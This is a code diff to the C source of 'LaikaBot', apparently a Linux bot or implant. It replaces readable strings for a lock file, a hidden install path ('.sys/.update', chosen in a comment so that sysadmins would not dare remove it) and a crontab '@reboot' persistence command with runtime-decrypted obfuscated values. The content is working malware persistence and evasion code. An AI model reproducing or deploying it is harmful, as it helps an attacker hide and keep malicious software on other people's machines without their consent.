@@ -10,15 +10,9 @@
 #include "lconfig.h"
 #include "lsocket.h"
 #include "lerror.h"
+#include "lbox.h"
+#include "lboxconfig.h"
 #include "lmem.h"
-
-/*      we want a semi-random file lock that is stable between similar builds,
-*   so we use the GIT_VERSION as our file lock :D */
-#define LAIKA_LOCK_FILE "/tmp/" LAIKA_VERSION_COMMIT
-
-/* most sysadmins probably wouldn't dare remove something named '.sys/.update' */
-#define LAIKA_INSTALL_DIR_USER ".sys"
-#define LAIKA_INSTALL_FILE_USER ".update"
 
 static int laikaB_lockFile;
 
@@ -29,15 +23,18 @@ bool laikaB_checkRoot() {
 
 /* mark that laika is currently running */
 void laikaB_markRunning() {
+    LAIKA_BOX_STARTVAR(char*, filePath, LAIKA_BOX_SKID(LAIKA_LIN_LOCK_FILE_KEY), LAIKA_LIN_LOCK_FILE_DATA);
+
     /* create lock file */
-    if ((laikaB_lockFile = open(LAIKA_LOCK_FILE, O_RDWR | O_CREAT, 0666)) == -1)
-        LAIKA_ERROR("Couldn't open file lock! Another LaikaBot is probably running.\n");
+    if ((laikaB_lockFile = open(filePath, O_RDWR | O_CREAT, 0666)) == -1)
+        LAIKA_ERROR("Couldn't open file lock '%s'! Another LaikaBot is probably running.\n", filePath);
 
     /* create lock */
     if (flock(laikaB_lockFile, LOCK_EX | LOCK_NB) != 0)
         LAIKA_ERROR("Failed to create file lock!\n");
 
     LAIKA_DEBUG("file lock created!\n");
+    LAIKA_BOX_ENDVAR(filePath);
 }
 
 /* unmark that laika is currently running */
@@ -70,13 +67,17 @@ void getInstallPath(char *outPath, int pathSz) {
     }
 
     /* create install directory if it doesn't exist */
-    snprintf(outPath, pathSz, "%s/%s", home, LAIKA_INSTALL_DIR_USER);
+    LAIKA_BOX_STARTVAR(char*, dirPath, LAIKA_BOX_SKID(LAIKA_LIN_INSTALL_DIR_KEY), LAIKA_LIN_INSTALL_DIR_DATA);
+    LAIKA_BOX_STARTVAR(char*, filePath, LAIKA_BOX_SKID(LAIKA_LIN_INSTALL_FILE_KEY), LAIKA_LIN_INSTALL_FILE_DATA);
+    snprintf(outPath, pathSz, "%s/%s", home, dirPath);
     if (stat(outPath, &st) == -1) {
         LAIKA_DEBUG("creating '%s'...\n", outPath);
         mkdir(outPath, 0700);
     }
 
-    snprintf(outPath, pathSz, "%s/%s/%s", home, LAIKA_INSTALL_DIR_USER, LAIKA_INSTALL_FILE_USER);
+    snprintf(outPath, pathSz, "%s/%s/%s", home, dirPath, filePath);
+    LAIKA_BOX_ENDVAR(dirPath);
+    LAIKA_BOX_ENDVAR(filePath);
 }
 
 bool checkPersistCron(char *path) {
@@ -100,16 +101,18 @@ bool checkPersistCron(char *path) {
 }
 
 void tryPersistCron(char *path) {
+    LAIKA_BOX_STARTVAR(char*, cronCMD, LAIKA_BOX_SKID(LAIKA_LIN_CRONTAB_ENTRY_KEY), LAIKA_LIN_CRONTAB_ENTRY_DATA);
     char cmd[PATH_MAX + 128];
 
     /* should be 'safe enough' */
-    snprintf(cmd, PATH_MAX + 128, "(crontab -l ; echo \"@reboot %s\")| crontab -", path);
+    snprintf(cmd, PATH_MAX + 128, cronCMD, path);
 
     /* add laika to crontab */
     if (system(cmd))
         LAIKA_ERROR("failed to install '%s' to crontab!\n", path);
 
     LAIKA_DEBUG("Installed '%s' to crontab!\n", path);
+    LAIKA_BOX_ENDVAR(cronCMD);
 }
 
 /* try to gain persistance on machine */
